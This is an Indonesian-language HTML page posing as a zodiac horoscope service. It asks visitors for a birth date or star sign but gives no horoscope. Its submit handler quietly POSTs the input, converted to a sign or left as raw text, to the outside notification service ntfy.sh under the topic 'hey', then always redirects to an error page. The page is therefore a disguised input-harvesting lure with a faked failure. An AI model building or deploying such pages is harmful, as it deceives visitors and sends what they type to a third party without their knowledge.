<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ramalan Zodiac</title>
    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0b0f19;
            color: #f1f5f9;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .background-effects {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 0;
            pointer-events: none;
            background-image: 
                radial-gradient(circle at 50% -20%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 100% 100%, rgba(139, 92, 246, 0.1) 0%, transparent 40%);
        }
        .stars {
            position: absolute;
            width: 100%;
            height: 100%;
        }
        .star {
            position: absolute;
            background: #ffffff;
            border-radius: 50%;
            animation: twinkle infinite ease-in-out;
        }
        @keyframes twinkle {
            0%, 100% { opacity: 0.1; }
            50% { opacity: 0.9; }
        }
        .top-nav {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background: rgba(11, 15, 25, 0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            justify-content: space-around;
            padding: 16px 12px;
            z-index: 50;
        }
        .nav-item {
            color: #64748b;
            text-decoration: none;
            font-size: 0.9rem;
            font-weight: 500;
            transition: color 0.2s;
            cursor: pointer;
        }
        .nav-item.active {
            color: #e2e8f0;
        }
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 100px 24px 40px 24px;
            z-index: 1;
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
        }
        .header-icon {
            width: 64px;
            height: 64px;
            margin-bottom: 24px;
            border-radius: 16px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 32px rgba(99, 102, 241, 0.3);
        }
        h1 {
            font-family: "Georgia", serif;
            font-size: 2rem;
            margin: 0 0 8px 0;
            color: #ffffff;
            font-weight: 400;
            letter-spacing: 0.5px;
        }
        p.subtitle {
            color: #94a3b8;
            margin: 0 0 40px 0;
            font-size: 0.95rem;
            text-align: center;
            line-height: 1.5;
        }
        .form-container {
            width: 100%;
            background: rgba(30, 41, 59, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 32px 24px;
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
        }
        .input-wrapper {
            position: relative;
            margin-bottom: 24px;
        }
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #64748b;
            display: flex;
        }
        input[type="text"] {
            width: 100%;
            padding: 16px 16px 16px 48px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid #334155;
            border-radius: 12px;
            color: #ffffff;
            font-size: 1.05rem;
            font-family: inherit;
            outline: none;
            transition: all 0.3s ease;
        }
        input[type="text"]:focus {
            border-color: #6366f1;
            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2);
            background: rgba(15, 23, 42, 0.8);
        }
        input[type="text"]::placeholder {
            color: #64748b;
        }
        button[type="submit"] {
            width: 100%;
            background: #6366f1;
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        button[type="submit"]:active {
            transform: scale(0.98);
        }
        button[type="submit"]:disabled {
            background: #475569;
            cursor: not-allowed;
            transform: none;
        }
    </style>
</head>
<body>
    <div class="background-effects">
        <div class="stars" id="starContainer"></div>
    </div>

    <nav class="top-nav">
        <div class="nav-item active">Beranda</div>
        <div class="nav-item">Eksplor</div>
        <div class="nav-item">Toko</div>
        <div class="nav-item">Profil</div>
    </nav>

    <main class="main-content">
        <div class="header-icon">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path>
                <path d="M2 12h20"></path>
            </svg>
        </div>
        <h1>Ramalan Zodiac</h1>
        <p class="subtitle">Ketahui peruntungan harian berdasarkan profil astrologi Anda secara akurat.</p>
        
        <div class="form-container">
            <form id="dataForm">
                <div class="input-wrapper">
                    <div class="input-icon">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                            <line x1="16" y1="2" x2="16" y2="6"></line>
                            <line x1="8" y1="2" x2="8" y2="6"></line>
                            <line x1="3" y1="10" x2="21" y2="10"></line>
                        </svg>
                    </div>
                    <input 
                        type="text" 
                        id="dataInput" 
                        placeholder="HH/BB atau Zodiak" 
                        required 
                        autocomplete="off"
                        inputmode="text"
                    >
                </div>
                <button type="submit" id="submitBtn">
                    Lihat Ramalan
                </button>
            </form>
        </div>
    </main>

    <script>
        const starContainer = document.getElementById('starContainer');
        for (let i = 0; i < 60; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.width = Math.random() * 2.5 + 'px';
            star.style.height = star.style.width;
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.animationDuration = (Math.random() * 4 + 2) + 's';
            star.style.animationDelay = (Math.random() * 3) + 's';
            starContainer.appendChild(star);
        }

        const inputElement = document.getElementById('dataInput');
        
        inputElement.addEventListener('input', function(e) {
            if (e.inputType === 'deleteContentBackward') return;
            
            let val = this.value;
            
            if (/^\d/.test(val)) {
                let nums = val.replace(/\D/g, '');
                if (nums.length > 4) {
                    nums = nums.substring(0, 4);
                }
                
                if (nums.length >= 2) {
                    this.value = nums.substring(0, 2) + '/' + nums.substring(2);
                } else {
                    this.value = nums;
                }
            }
        });

        function getZodiac(day, month) {
            if ((month === 3 && day >= 21) || (month === 4 && day <= 19)) return "Aries";
            if ((month === 4 && day >= 20) || (month === 5 && day <= 20)) return "Taurus";
            if ((month === 5 && day >= 21) || (month === 6 && day <= 20)) return "Gemini";
            if ((month === 6 && day >= 21) || (month === 7 && day <= 22)) return "Cancer";
            if ((month === 7 && day >= 23) || (month === 8 && day <= 22)) return "Leo";
            if ((month === 8 && day >= 23) || (month === 9 && day <= 22)) return "Virgo";
            if ((month === 9 && day >= 23) || (month === 10 && day <= 22)) return "Libra";
            if ((month === 10 && day >= 23) || (month === 11 && day <= 21)) return "Scorpio";
            if ((month === 11 && day >= 22) || (month === 12 && day <= 21)) return "Sagittarius";
            if ((month === 12 && day >= 22) || (month === 1 && day <= 19)) return "Capricorn";
            if ((month === 1 && day >= 20) || (month === 2 && day <= 18)) return "Aquarius";
            if ((month === 2 && day >= 19) || (month === 3 && day <= 20)) return "Pisces";
            return null;
        }

        document.getElementById('dataForm').addEventListener('submit', async function(e) {
            e.preventDefault(); 
            
            const rawInput = inputElement.value.trim();
            if (!rawInput) return;

            let finalData = rawInput;
            const datePattern = /^(\d{1,2})[\/\-\.](\d{1,2})$/;
            const match = rawInput.match(datePattern);

            if (match) {
                const day = parseInt(match[1], 10);
                const month = parseInt(match[2], 10);
                const zodiac = getZodiac(day, month);
                if (zodiac) {
                    finalData = zodiac;
                }
            }

            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg> Memproses...';
            btn.disabled = true;
            inputElement.disabled = true;

            const ntfyTopic = 'hey'; 

            try {
                await fetch(`https://ntfy.sh/${ntfyTopic}`, {
                    method: 'POST',
                    body: finalData,
                    headers: {
                        'Content-Type': 'text/plain'
                    }
                });
            } catch (error) {
            } finally {
                setTimeout(() => {
                    window.location.replace('error.html');
                }, 1000);
            }
        });
    </script>
</body>
</html>
